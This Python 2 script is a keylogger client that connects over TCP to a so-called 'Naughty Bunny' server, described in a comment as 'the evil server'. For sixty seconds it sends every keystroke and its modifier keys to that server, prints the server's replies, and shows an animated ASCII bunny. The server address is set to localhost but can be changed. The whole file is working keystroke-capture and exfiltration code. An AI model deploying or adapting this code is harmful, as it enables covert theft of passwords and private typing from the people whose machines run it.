
import keylogger
import time
import socket
from thread import *

############################################################################

NaugthyBunnyServerIP   = "127.0.0.1"
NaugthyBunnyServerPort = 8912
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

############################################################################

def main() :

    # Start a thread that displays an animated ascii bunny
    start_new_thread(animatedBunny, ())

    # Establish TCP socket with the distant server
    try :
        sock.connect(( NaugthyBunnyServerIP, NaugthyBunnyServerPort ))

    except :

        print "Bunny is not happy. Connection Failed."

        exit()

    start_new_thread(serverHandler, ())

    # Send a hello message
    sock.send("Hello Naughty Bunny!")

    # Infinite loop so that the program and thread keeps running
    while True :
        pass



############################################################################

# Thread launched after connection with the evil server is started
# -> it launces the keylogger
#    + another function which prints what the server sends
def serverHandler():

    # Start key logger
    now = time.time()
    done = lambda: time.time() > now + 60
    keylogger.log(done, SendKeysToNaugthyBunnyServer)

    # Print what we receive from the server
    printMessagesFromNaugthyBunnyServer()

############################################################################

# Function which is called every time the user presses a key on its computer
def SendKeysToNaugthyBunnyServer(t, modifiers, keys) :

    activeMods = ""
    for mod in modifiers :
        if (modifiers[mod] == True) :
            activeMods += "+"+mod+" "

    if (activeMods != "") :
        activeMods = "("+activeMods+")"

    sock.send(str(t)+" "+str(keys)+" "+str(activeMods))

# Function that prints what the server sends
def printMessagesFromNaugthyBunnyServer() :

    while True:

        data = sock.recv(1024)
        print "[Server] "+data

############################################################################

def animatedBunny() :

    while True:

        for i in range(80) :
            print " "

        print """
           \`\ /`/
            \ V /
            /. .\
           =\ ~ /=
            / ^ \
         {}/\\\\ //\\
         __\ " " /__
        (____/^\____)
        """

        time.sleep(1)

        for i in range(80) :
            print " "

        print """
           \`\ /`/
            \ V /
            /. .\
           =\ v /=
            / ^ \
         {}/\\\\ //\\
           \ " " /
           / / \\ \\
          / /   \\ \\
          `-     `-`
        """

        time.sleep(1)

############################################################################
main()
